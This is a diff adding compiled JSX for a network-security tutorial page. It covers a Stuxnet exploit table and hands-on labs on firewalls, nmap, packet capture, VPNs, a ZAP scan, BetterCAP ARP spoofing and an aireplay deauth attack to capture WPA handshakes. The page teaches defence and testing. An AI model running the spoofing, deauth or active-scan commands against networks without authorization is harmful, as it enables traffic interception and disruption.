+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Type"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Description"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "MS10-046"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "LNK"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Auto-execute via USB shortcut icon parsing"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "MS10-061"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "EoP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Print Spooler privilege escalation"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "MS08-067"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "RCE"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Server Service buffer overflow (also used by Conficker)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "CVE-2010-2772"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "LPE"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Siemens Step 7 hardcoded password vulnerability"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Significance:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Nation-state cyber attack on critical infrastructure"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Proved air-gapped networks can be breached"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Changed international cybersecurity policy forever"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Led to creation of OT-specific security frameworks (NIST SP 800-82)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Lessons Learned:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Air gaps are not absolute (USB vectors)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Supply chain security is critical"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Industrial control systems need network segmentation from IT"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Software signing provides authenticity but not safety"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "OT systems need anomaly detection for behavioral deviation"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-12-practical-hands-on-lab",
+      children: "Section 12: Practical Hands-On Lab"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "121-lab-setup",
+      children: "12.1 Lab Setup"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "All labs below assume a Kali Linux or Ubuntu system. For Windows users, use WSL2 with Ubuntu."
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "122-iptablesnftables--basic-firewall-implementation",
+      children: "12.2 iptables/nftables → Basic Firewall Implementation"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Scenario:"
+      }), " Build a stateful firewall for a web server that allows SSH from management, HTTP/HTTPS to everyone, and blocks all other traffic."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "#!/bin/bash\n# basic-firewall.sh\n\n# Flush existing rules\niptables -F\niptables -X\niptables -t nat -F\niptables -t mangle -F\n\n# Set default policies\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT\n\n# Allow loopback\niptables -A INPUT -i lo -j ACCEPT\n\n# Allow established connections\niptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT\n\n# Allow SSH from management subnet only\niptables -A INPUT -p tcp -s 10.0.0.0/24 --dport 22 -j ACCEPT\n\n# Allow HTTP and HTTPS\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\n\n# Allow ICMP (limited)\niptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 5 -j ACCEPT\n\n# Log dropped packets\niptables -A INPUT -j LOG --log-prefix \"FW-DROPPED: \" --log-level 4\n\n# Save rules\niptables-save > /etc/iptables/rules.v4\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "nftables equivalent:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "#!/usr/bin/nft -f\n\nflush ruleset\n\ntable inet filter {\n    chain input {\n        type filter hook input priority 0; policy drop;\n\n        # Loopback\n        iif lo accept\n\n        # Established/related\n        ct state {established, related} accept\n\n        # SSH from management\n        tcp dport ssh ip saddr 10.0.0.0/24 accept\n\n        # Web services\n        tcp dport {http, https} accept\n\n        # ICMP rate limit\n        icmp type echo-request limit rate 1/second accept\n\n        # Log dropped\n        log prefix \"nft-drop: \"\n    }\n\n    chain forward {\n        type filter hook forward priority 0; policy drop;\n    }\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Verification:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Test firewall rules\niptables -L -v -n\n\n# Expected output:\n# Chain INPUT (policy DROP 0 packets, 0 bytes)\n#  pkts bytes target     prot opt in     out     source               destination\n#    10   840 ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0\n#   250 12500 ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED\n#     5   300 ACCEPT     tcp  --  *      *       10.0.0.0/24          0.0.0.0/0            tcp dpt:22\n#  1500  90K ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80\n#  1200  72K ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:443\n#     3   252 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            icmptype 8 limit: avg 1/sec burst 5\n#     2   120 LOG        all  --  *      *       0.0.0.0/0            0.0.0.0/0            LOG flags 0 level 4 prefix \"FW-DROPPED: \"\n\n# Test remote SSH (should work from 10.0.0.x)\nssh user@192.168.1.1\n\n# Test remote SSH (should fail from other subnets)\n# Connection times out or refused\n\n# Test HTTP (should work)\ncurl -I http://192.168.1.1\n# Expected: HTTP/1.1 200 OK\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "123-nmap--service-detection-os-fingerprinting-nse-scripts",
+      children: "12.3 Nmap → Service Detection, OS Fingerprinting, NSE Scripts"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. Basic port scan\nnmap -sS 192.168.1.1\n\n# Expected output:\n# Starting Nmap 7.94 ( https://nmap.org )\n# Nmap scan report for 192.168.1.1\n# Host is up (0.0012s latency).\n# PORT     STATE    SERVICE\n# 22/tcp   open     ssh\n# 80/tcp   open     http\n# 443/tcp  open     https\n\n# 2. Service version detection\nnmap -sV 192.168.1.1\n\n# Expected:\n# 22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6\n# 80/tcp   open  http    Apache httpd 2.4.57\n# 443/tcp  open  ssl     Apache httpd 2.4.57\n\n# 3. OS fingerprinting\nnmap -O 192.168.1.1\n\n# Expected:\n# OS details: Linux 5.15.0 - 6.2.0 (Linux 5.15 - 6.5)\n# Network Distance: 1 hop\n# Aggressive OS guesses: Linux 5.15.0-86-generic (95%)\n\n# 4. NSE Vulnerability Scan\nnmap --script vuln 192.168.1.1\n\n# Expected (may show):\n# PORT     STATE SERVICE\n# 80/tcp   open  http\n# | http-shellshock:\n# |   VULNERABLE:\n# |   Shellshock - CGI-based vulnerability\n# |   State: VULNERABLE (Exploitable)\n# |_  Description: ...\n\n# 5. Comprehensive NSE script scan\nnmap -sC -sV -O --script=http-headers,ssl-enum-ciphers 192.168.1.1\n\n# Expected:\n# | ssl-enum-ciphers:\n# |   TLSv1.2:\n# |     ciphers:\n# |       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A\n# |       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A\n# |   TLSv1.3:\n# |     ciphers:\n# |       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "OS Fingerprinting Technique:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Nmap sends a series of TCP probes to open and closed ports and analyzes:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Initial TTL"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Window size"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "TCP options (MSS, WS, SACK_PERM, Timestamp)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "IP ID sequence patterns"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "DF (Don't Fragment) bit behavior"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Example:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Linux: TTL=64, Window=5840, MSS=1460, WS=7, TSval freq=100Hz\nWindows: TTL=128, Window=65535, MSS=1460, WS=8, TSval freq=100ms\nCisco IOS: TTL=255, Window=4128, No TS, No WS\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "124-wiresharktshark--deep-packet-inspection",
+      children: "12.4 Wireshark/tshark → Deep Packet Inspection"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. Capture HTTP traffic on port 80\ntshark -i eth0 -f \"tcp port 80\" -c 100\n\n# Expected output (abbreviated):\n# 1   0.000000  192.168.1.100 → 93.184.216.34  TCP 74 52342 → 80 [SYN] Seq=0\n# 2   0.042000  93.184.216.34 → 192.168.1.100 TCP 74 80 → 52342 [SYN, ACK] Seq=0 Ack=1\n# 3   0.042100  192.168.1.100 → 93.184.216.34  TCP 66 52342 → 80 [ACK] Seq=1 Ack=1\n# 4   0.042500  192.168.1.100 → 93.184.216.34  HTTP 145 GET / HTTP/1.1\n# 5   0.085000  93.184.216.34 → 192.168.1.100  TCP 66 80 → 52342 [ACK] Seq=1 Ack=80\n\n# 2. Follow TCP stream\ntshark -i eth0 -z follow,tcp,ascii,0\n\n# 3. Display filters for common attacks\ntshark -r capture.pcap -Y \"http.request.uri contains \\\"union\\\" or http.request.uri contains \\\"select\\\"\"\n\n# 4. Extract HTTP objects\ntshark -r capture.pcap --export-objects \"http,/tmp/extracted\"\n\n# 5. Detect ARP spoofing\ntshark -r capture.pcap -Y \"arp.duplicate-address-detected\"\n\n# 6. Analyze TLS handshake\ntshark -r capture.pcap -Y \"tls.handshake.type == 1\" -T fields -e tls.handshake.extensions_server_name\n\n# Expected: example.com\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Wirehsark GUI Workflow for Attack Investigation:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "1. Open capture file: File → Open\n2. Apply filter: http.request or tls.handshake.type == 1\n3. Follow TCP stream on suspicious connection: Right-click → Follow → TCP Stream\n4. Export objects: File → Export Objects → HTTP/SMB\n5. Statistics → Protocol Hierarchy (understand traffic composition)\n6. Statistics → Conversations (top talkers)\n7. Analyze → Expert Information (automatic anomaly detection)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "125-tcpdump--packet-capture-and-analysis",
+      children: "12.5 tcpdump → Packet Capture and Analysis"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. Capture all traffic on interface\ntcpdump -i eth0\n\n# 2. Capture with count limit\ntcpdump -i eth0 -c 1000\n\n# 3. Capture to file (for later analysis)\ntcpdump -i eth0 -w capture.pcap -s 0\n\n# 4. Read from file\ntcpdump -r capture.pcap\n\n# 5. Filter by host\ntcpdump -i eth0 host 192.168.1.100\n\n# 6. Filter by port\ntcpdump -i eth0 port 80 or port 443\n\n# 7. Capture TCP SYN packets only\ntcpdump -i eth0 \"tcp[tcpflags] & (tcp-syn) != 0\"\n\n# 8. Capture DNS queries\ntcpdump -i eth0 udp port 53\n\n# 9. Verbose output with hex dump\ntcpdump -i eth0 -X -n port 80\n\n# Example output:\n# 12:34:56.789012 IP 192.168.1.100.52342 > 93.184.216.34.80: Flags [S], seq 1234567890, ...\n#         0x0000: 4500 003c 1c46 4000 4006 a4b6 c0a8 0164  E..<.F@.@......d\n#         0x0010: 5db8 d822 cc66 0050 4996 0f84 0000 0000  ]..\".f.PI......\n\n# 10. Monitor for SYN flood\ntcpdump -i eth0 -n \"tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0\" | head -100\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "SYN Flood Detection Dry Run:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Monitor SYN packets without ACK\ntcpdump -i eth0 -n \"tcp[13] & 2 != 0 and tcp[13] & 16 == 0\"\n\n# Expected output (SYN flood indicators):\n# 12:00:01.000 IP 192.168.1.100.10000 > 10.0.0.1.80: Flags [S], seq 1000\n# 12:00:01.001 IP 192.168.1.101.10001 > 10.0.0.1.80: Flags [S], seq 2000\n# 12:00:01.002 IP 192.168.1.102.10002 > 10.0.0.1.80: Flags [S], seq 3000\n# 12:00:01.003 IP 10.0.0.1.10003 > 10.0.0.1.80: Flags [S], seq 4000  (spoofed source)\n# 12:00:01.004 IP 192.168.1.103.10004 > 10.0.0.1.80: Flags [S], seq 5000\n# ...\n# 1000+ SYN packets per second, no ACKs returning → SYN flood confirmed\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "126-openvpn-setup",
+      children: "12.6 OpenVPN Setup"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Install OpenVPN and Easy-RSA\napt update\napt install openvpn easy-rsa\n\n# Set up PKI\nmake-cadir ~/openvpn-ca\ncd ~/openvpn-ca\n\n# Initialize PKI\n./easyrsa init-pki\n./easyrsa build-ca nopass\n\n# Generate server certificate\n./easyrsa gen-req server nopass\n./easyrsa sign-req server server\n\n# Generate Diffie-Hellman parameters\n./easyrsa gen-dh\n\n# Generate TLS crypt key\nopenvpn --genkey --secret ta.key\n\n# Generate client certificate\n./easyrsa gen-req client1 nopass\n./easyrsa sign-req client client1\n\n# Server configuration\ncat > /etc/openvpn/server.conf << 'EOF'\nport 1194\nproto udp\ndev tun\nca /etc/openvpn/ca.crt\ncert /etc/openvpn/server.crt\nkey /etc/openvpn/server.key\ndh /etc/openvpn/dh.pem\ntls-auth /etc/openvpn/ta.key 0\nserver 10.8.0.0 255.255.255.0\nifconfig-pool-persist ipp.txt\npush \"redirect-gateway def1 bypass-dhcp\"\npush \"dhcp-option DNS 208.67.222.222\"\npush \"dhcp-option DNS 208.67.220.220\"\nkeepalive 10 120\ncipher AES-256-GCM\nauth SHA256\nuser nobody\ngroup nogroup\npersist-key\npersist-tun\nstatus openvpn-status.log\nlog-append /var/log/openvpn.log\nverb 3\nexplicit-exit-notify 1\nEOF\n\n# Enable IP forwarding\nsysctl -w net.ipv4.ip_forward=1\n\n# Start OpenVPN\nsystemctl start openvpn@server\nsystemctl enable openvpn@server\n\n# Verify connection\njournalctl -u openvpn@server\n\n# Expected output:\n# ovpn-server[1234]: MULTI: multi_create_instance called\n# ovpn-server[1234]: 203.0.113.5:56789 Re-using SSL/TLS context\n# ovpn-server[1234]: 203.0.113.5:56789 [client1] Peer Connection Initiated with [AF_INET]203.0.113.5:56789\n# ovpn-server[1234]: client1/203.0.113.5:56789 MULTI: Learn: 10.8.0.6 -> client1/203.0.113.5:56789\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "127-wireguard-quick-setup",
+      children: "12.7 WireGuard Quick Setup"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Install WireGuard\napt install wireguard\n\n# Generate server keys\nwg genkey | tee /etc/wireguard/server_private.key | wg pubkey > /etc/wireguard/server_public.key\n\n# Generate client keys\nwg genkey | tee /etc/wireguard/client_private.key | wg pubkey > /etc/wireguard/client_public.key\n\n# Server configuration\ncat > /etc/wireguard/wg0.conf << 'EOF'\n[Interface]\nAddress = 10.0.0.1/24\nListenPort = 51820\nPrivateKey = <server-private-key>\n\n# NAT/masquerade for client traffic\nPostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\nPostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE\n\n[Peer]\nPublicKey = <client-public-key>\nAllowedIPs = 10.0.0.2/32\nEOF\n\n# Start WireGuard\nsystemctl start wg-quick@wg0\nsystemctl enable wg-quick@wg0\n\n# Verify\nwg show\n\n# Expected:\n# interface: wg0\n#   public key: <server-public-key>\n#   private key: (hidden)\n#   listening port: 51820\n# \n# peer: <client-public-key>\n#   endpoint: 203.0.113.5:51820\n#   allowed ips: 10.0.0.2/32\n#   latest handshake: 1 minute, 30 seconds ago\n#   transfer: 42.5 KiB received, 128.3 KiB sent\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "128-zap-proxy--web-traffic-inspection",
+      children: "12.8 ZAP Proxy → Web Traffic Inspection"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Install ZAP\napt install zaproxy\n# Or download from https://www.zaproxy.org/download/\n\n# Start ZAP in daemon mode (headless)\nzap.sh -daemon -port 8081 -host 127.0.0.1\n\n# Configure browser to use proxy 127.0.0.1:8081\n\n# Python script for automated scan\ncat > zap-scan.py << 'PYEOF'\nfrom zapv2 import ZAPv2\n\ntarget = \"http://testphp.vulnweb.com/\"\nzap = ZAPv2(apikey=\"\", proxies={\"http\": \"http://127.0.0.1:8081\", \"https\": \"http://127.0.0.1:8081\"})\n\n# Spider the target\nprint(\"Spidering target...\")\nscan_id = zap.spider.scan(target)\nwhile int(zap.spider.status(scan_id)) < 100:\n    print(f\"Spider progress: {zap.spider.status(scan_id)}%\")\nzap.spider.stop(scan_id)\n\n# Active scan\nprint(\"Starting active scan...\")\nscan_id = zap.ascan.scan(target)\nwhile int(zap.ascan.status(scan_id)) < 100:\n    print(f\"Scan progress: {zap.ascan.status(scan_id)}%\")\nzap.ascan.stop(scan_id)\n\n# Report findings\nalerts = zap.core.alerts()\nprint(f\"\\nTotal alerts found: {len(alerts)}\")\nfor alert in alerts[:10]:\n    print(f\"  [{alert['risk']}] {alert['alert']} - {alert['url']}\")\nPYEOF\n\n# Run automated scan\npython3 zap-scan.py\n\n# Expected output:\n# Spidering target...\n# Spider progress: 10%\n# ...\n# Starting active scan...\n# Scan progress: 25%\n# ...\n# Total alerts found: 15\n#   [High] SQL Injection - http://testphp.vulnweb.com/artists.php?artist=1\n#   [Medium] Cross-Site Scripting (Reflected) - http://testphp.vulnweb.com/search.php\n#   [Low] Web Browser XSS Protection Not Enabled - http://testphp.vulnweb.com/\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "129-bettercap--arp-spoofing-detection",
+      children: "12.9 BetterCAP → ARP Spoofing Detection"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Install BetterCAP\napt install bettercap\n\n# Start BetterCAP\nsudo bettercap -eval \"set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on\"\n\n# Expected output:\n# [04:00:00] [sys.log] [inf] arp.spoof: ARP spoofer started targeting 192.168.1.100\n# [04:00:00] [sys.log] [inf] net.sniff: started (type: *any*)\n\n# Detection on victim machine (192.168.1.100):\n# 1. Check ARP cache\narp -a\n# Expected:\n# 192.168.1.1 at 00:11:22:33:44:55 [ether] on eth0  ← gateway MAC\n# \n# ARP spoofing indicator (two entries for same IP):\n# ? (192.168.1.1) at AA:BB:CC:DD:EE:FF on eth0\n# ? (192.168.1.1) at 00:11:22:33:44:55 on eth0\n# Duplicate entries → ARP spoofing detected\n\n# 2. Detection with arpwatch\narpwatch -i eth0\n# Logs: /var/log/arpwatch.log\n# Expected alert:\n# changed ethernet address (00:11:22:33:44:55 -> AA:BB:CC:DD:EE:FF) 192.168.1.1\n\n# 3. Static ARP entry (prevention)\narp -s 192.168.1.1 00:11:22:33:44:55\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1210-airodumpaireplay--wireless-testing",
+      children: "12.10 Airodump/aireplay → Wireless Testing"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Step 1: Enable monitor mode\nairmon-ng start wlan0\n# Expected: wlan0mon created\n\n# Step 2: Discover networks\nairodump-ng wlan0mon\n# Expected:\n# BSSID              PWR  Beacons   #Data CH  MB   ENC  CIPHER AUTH ESSID\n# 00:11:22:33:44:55 -67  245       1200   6   540  WPA2 CCMP   PSK   CorpNet\n# AA:BB:CC:DD:EE:FF -79  89        0      11  130  WPA2 CCMP   PSK   GuestNet\n\n# Step 3: Capture on specific channel and BSSID\nairodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon\n# Expected: Beacon/JMX frames, data packets, and [WPA handshake] when client connects\n\n# Step 4: Deauth attack to force handshake capture\naireplay-ng -0 2 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon\n# Expected:\n# 12:34:56  Sending 64 directed DeAuth.  STMAC: [AA:BB:CC:DD:EE:FF] [ 2|22 ACKs]\n\n# Step 5: Verify handshake captured\naircrack-ng capture-01.cap\n# Expected:\n# Opening capture-01.cap\n# Read 1000 packets.\n#    #  BSSID              ESSID                     Encryption\n#    1  00:11:22:33:44:55  CorpNet                   WPA (1 handshake)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-13-comparison-tables",
+      children: "Section 13: Comparison Tables"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "131-firewall-type-comparison",
+      children: "13.1 Firewall Type Comparison"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Aspect"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Packet Filter"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Stateful"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Proxy Firewall"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "NGFW"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "WAF"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "OSI Layers"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "3, 4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "3, 4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "3-7 (all layers)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "7 only"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Inspection Depth"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Headers only"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Headers + state"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Full protocol"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "DPI + apps"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "HTTP/HTTPS"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Connection Tracking"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (dual)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Application ID"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (per protocol)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (App-ID)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "HTTP apps only"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "User Identity"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Limited"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (AD/LDAP)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Often"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "TLS Inspection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (MITM)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (reverse proxy)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Performance"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Line rate"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Near line rate"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Depends on app"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "DPI-dependent"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Moderate"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Configuration"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Simple"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Complex"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Complex"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          })]
